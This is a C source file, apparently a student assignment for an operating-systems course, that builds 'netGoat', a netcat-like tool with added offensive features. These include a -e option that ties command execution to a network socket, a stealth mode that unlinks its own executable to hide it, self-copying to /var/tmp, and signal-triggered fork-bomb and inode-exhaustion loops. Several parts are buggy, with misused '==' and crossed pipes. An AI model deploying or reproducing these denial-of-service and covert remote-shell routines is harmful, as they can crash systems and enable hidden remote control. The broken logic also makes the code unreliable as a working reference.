/*
	Author: MIDN 3/C Lindow 
	Course: SY204 - OS Fundamentals
	Instructor: Mr. De Bels, NSA Visiting Professor

	Description: Similar to netCat, with various additional functionality
	 			 detailed below

  Last Modified: 1040 19 Apr 18
*/

// Required Includes
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <getopt.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

//Global Variables & Constants
int BUF_LEN = 2048;  //Buffer overflow handling
char *exeName; // argv[0] (don't have to pass argv[])
int stealth = 0; //Steath mode status indicator
int old_goat_fd, new_goat_fd, type, sig_flag1, sig_flag2;
char* command; //command line argument string
char* const* args; //arrary of const pointers to mutable char arrays
char mode; //flag for server or client mode
int port, IP_ADDR;
int pfdtoChild[2]; //pipes
int pfdtoParent[2]; //pipes
int execute; //flag for -e option
struct sockaddr_in socket_struc;

//Function Prototypes
char getoptions(int argc, char*argv[]);
void read_write(int fdr, int fdw);
void stealthmode(int status);
void SigHand(int SigNum, siginfo_t *sigInfo, void *SysDependent);
void Attack(int type);
void execute_cmd(char * command, char* const* args);

//Main Function
int main(int argc, char* argv[])
{
   char buffer[BUF_LEN];
   //get name of executable
     exeName = argv[0];

   //signal handling
     struct sigaction handler;
     handler.sa_sigaction = &SigHand;
     handler.sa_flags = SA_SIGINFO | SA_RESTART;
     sigaction(SIGUSR1, &handler, NULL);
     sigaction(SIGUSR2, &handler, NULL);

   //Get Options
     getoptions(argc, argv);

   //SERVER MODE
         if(mode == 's'){
           int sockfd = socket(AF_INET, SOCK_STREAM, 0);
          //Setup Structure
            //IPv4
            socket_struc.sin_family = AF_INET;
            //Allow Any IP to Connect
            socket_struc.sin_addr.s_addr = htons(INADDR_ANY);
            //Port Number
            socket_struc.sin_port = htons(port);

         //Listen to comms
            bind(sockfd, (struct sockaddr *)&socket_struc, sizeof(socket_struc));
            listen(sockfd, 1); //only allow 1 host to connect
            int size = sizeof(struct sockaddr_in);
            while(1)
              {
                printf("Server Mode: Awaiting Messages....\n\n");
                accept(sockfd, (struct sockaddr *)&socket_struc, (socklen_t*)&size);

                //Read from STDIN
                int length = read(0, buffer, BUF_LEN);

                //Write to Host
                send(sockfd, buffer, length, 0);

                if(execute == 1){
                   //Send contents of socket to child STDIN
                    send(pfdtoChild[0], buffer, length, 0);
                   //Send STDOUT of Child to socket
                    length = read(pfdtoParent[0], buffer, BUF_LEN);
                    send(sockfd, buffer, length, 0); }
                else{
                    send(sockfd, buffer, length, 0); }
              }
          }
   //CLIENT MODE
     if(mode == 'c') {
       int sockfd = socket(AF_INET, SOCK_STREAM, 0);
       //Setup Structure
        socket_struc.sin_family = AF_INET;
        socket_struc.sin_port = htons(port);
       //Connect
        connect(sockfd, (struct sockaddr*)&socket_struc, sizeof(socket_struc));
      while(1) {
        printf("Client Mode. Awaiting Messages....\n\n");
       //Read & Write Data
        int length = recv(sockfd, buffer, 2048, 0);
        write(1, buffer, length);

        length = read(0, buffer, 2048);
        send(sockfd, buffer, length, 0);

       //Check for -e option
        if(execute == 1){
          printf("Execute mode detected, redirecting steam I/O\n");
          //Send contents of socket to child STDIN
          send(pfdtoChild[0], buffer, length, 0);
          //Send STDOUT of child to socket
          length = read(pfdtoParent[0], buffer, BUF_LEN);
          send(sockfd, buffer, length, 0); } //End of Execute if statement

      } //End of While loop

    }//End of Client Mode "If" statement

   //rewrite netGoat if in stealth mode
   if( stealth == 1){
     stealthmode(1); } //Deactivate Stealth Mode
   //End of Program
      return(0);
}


/***********************************************************************
   Title: Get Option Function
   Description: This function parses command line arguments
                It takes the following characters as possible options:
		1) -f : take file name as arg
		2) -s : enter stealth mode
 		3) -h : display help message
		4) -t : Set SIGUUSR of given argument to toggle stealth mode
    5) -c : Set SIGUUSR of given argument to copy to var/tmp
    6) -b : Set SIGUUSR of given argument to F Bomb attack
    7) -i : Set SIGUUSR of given argument to I-Node overflow attack
    8) -e : execute the given command
************************************************************************/

char getoptions(int argc, char* argv[])
{
  //Variable Declarations
    	int fdr, opt;
      int optcount = 0;
  //Check number of arguments
    	int min_arg = 0;
    	if( argc < min_arg) {
    	   printf("Error Message"); exit(0); }

  //Parse Command Options
    	while( (opt = getopt(argc, argv, "hs:t:c:b:i:e:l:f:") ) != -1)
    	{
         optcount++;
    	   switch(opt) {
          //HelpMessage
      		  case 'h':
      		     printf("Help Message");
      	       exit(0);
               break;
          //Enter Stealth Mode
      		  case 's':
         		   stealthmode(0); //activate stealth mode
      		     stealth = 1; // set global = 1. Indicates stealth mode active.
               break;
          //Toggle Stealth Mode
            case 't':
               if( (int) *argv[optind-1] == 1){
                 sig_flag1 == 't';} // SIGUSR1 == t

               if( (int) *argv[optind-1] == 2){
                 sig_flag2 == 't';} // SIGUSR2 == t
               break;
          //Copy exeFile to var/tmp
            case 'c':
               if( (int) *argv[optind-1] == 1){
                 sig_flag1 == 'c';} // SIGUSR1 == c
               if( (int) *argv[optind-1] == 2){
                 sig_flag2 == 'c';} // SIGUSR2 == c
               break;
          //Fork Bomb
            case 'b':
              if( (int) *argv[optind-1] == 1){
                sig_flag1 == 'b';} //SIGUSR1 == b
              if( (int) *argv[optind-1] == 2){
                sig_flag2 == 'b';} //SIGUSR2 == b
              break;
          //I-Node overflow
            case 'i':
              if( (int) *argv[optind-1] == 1){
                sig_flag1 == 'i';} //SIGUSR1 == i
              if( (int) *argv[optind-1] == 2){
                sig_flag2 == 'i';} //SIGUSR2 == i
              break;
          //Execute Command
            case 'e':
              command = (char *) argv[optind - 1];
              args = &argv[optind - 1];
              execute = 1;
              execute_cmd(command, args);
              break;
          //CAT a file
            case 'f':
              fdr = open(argv[optind - 1], O_RDONLY);
              read_write(fdr, 1); // read fdr and write to STDOUT
              break;

          //Server Mode
            case 'l':
              mode = 's'; //set server mode
              port = atoi(optarg);
              break;
          //Default
      		  default:
      		     exit(0); }
   }
   //Client Mode!
   //Get Non Command Options
   int i;
   for(i = optind; i < argc; i++){
     if(i == optind){ //First NONOPT ARG
      // printf("Non option: %s\n", argv[i]);
       inet_pton(AF_INET, argv[i], &socket_struc.sin_addr);}
     if(i == optind + 1){
      // printf("Non option: %s\n", argv[i]);
       port = atoi(argv[i]);}
   }

   if(argc == 3 && optcount == 0) {
     mode = 'c'; }
}

//-------------------------------------------------------------------

/* Title: Read and Write
   Description: Takes a file descriptor as arg1
                a prints contents to arg2.

*/

void read_write(int fdr, int fdw) {
 //Variables
    int size = 1;
    char file_data[BUF_LEN];
    char err_message[] = "Error reading/writing file. Program terminating.";

 //Read & write until end of file
    while(size > 0) {
	size = read(fdr, file_data, BUF_LEN);
	if ( write (fdw, file_data, size) < 0){
	   printf("New FD: %d\n", fdw);
	   perror("Error writing to new file"); }
   }
}

//-------------------------------------------------------------------
/* Title: Stealth Mode
   Description: This function hides the netGoat.c program from ls
*/

void stealthmode(int status)
{
  // Activate Stealth Mode
     if (status == 0) {
	   //Open file
	      old_goat_fd = open(exeName, O_RDONLY);
	   //Unlink file
	       if (unlink(exeName) < 0) {
	          printf("Error entering stealth mode. Program continuing...");}
        }

  // Deactivate Stealth Mode
     if (status == 1) {
       //Open new executable
         new_goat_fd = open(exeName, O_CREAT | O_WRONLY, 0777);
       //Re-write to new executable
	       read_write(old_goat_fd, new_goat_fd);
       //Close files
	       close(new_goat_fd); close(old_goat_fd);
     }

}

//-------------------------------------------------------------
void SigHand(int SigNum, siginfo_t*sigInfo, void *SysDependent)

{
    if(SigNum == 1)
      {
        switch(sig_flag1)
              {
              case 't': //toggle stealth
                Attack(1); break;
              case 'c': //copy file to tmp/var
                Attack(2); break;
              case 'b': // fork bomb
                Attack(3); break;
              case 'i': //i-node overflow
                Attack(4); break;
              default:
                Attack(1); break;
              }
      }

    if(SigNum == 2)
      {
        switch(sig_flag2)
              {
              case 't': //toggle stealth
                Attack(1); break;
              case 'c': //copy file to tmp/var
                Attack(2); break;
              case 'b': // fork bomb
                Attack(3); break;
              case 'i': //i-node overflow
                Attack(4); break;
              default:
                Attack(2); break;
              }
      }
}
/******************************************************/
void Attack(int type)
{
  //Toggle Stealth Mode
    if(type == 1)
      {
        //Check current status
           if(stealth == 1){ //Stealth Mode Active
            stealthmode(1);} //Deactivate Stealth Mode

           if(stealth == 0){ //Stealth mMde Inactive
            stealthmode(0);} //Deactivate Stealth Mode
      }
 // Create Temp File
    if(type == 2)
      {
        //file location & name
          char template[] = "/var/tmp/goatCopy";
        //Make temp file
          int temp_fd = mkstemp(template);
        //Open executable for reading only
          int goat_fd = open(exeName, O_RDONLY); // open executable for reading
        //write contents of executable to new file descriptor
          read_write(goat_fd, temp_fd);
     }
 //Fork Bomb
    if(type == 3)
     {
       while(2020){
         fork();}
     }
 // I-node Overflow
    if(type == 4)
      {
        while(2020) {
           open("haha.txt", O_CREAT, 0000); }
      }

}

/******************************************************************************/
void execute_cmd(char * command, char* const* args)
{
  //Variables
    pid_t forkID;
    pipe(pfdtoChild);
    pipe(pfdtoParent);

  //Fork
    forkID = fork();

  //Parent
    if(forkID > 0) {
    //close STDIN
      close(0);
    //Redirect STDIN to write end of pipe
      dup2(pfdtoChild[0], 0);
    //Wait on Child
      wait(NULL); }


  //Child

    if(forkID == 0){
      execvp(command,args);
    //Close STDOUT
      close(1);
    //Redirect STDOUT to write end of pipe
      dup2(pfdtoParent[0], 1); }
}
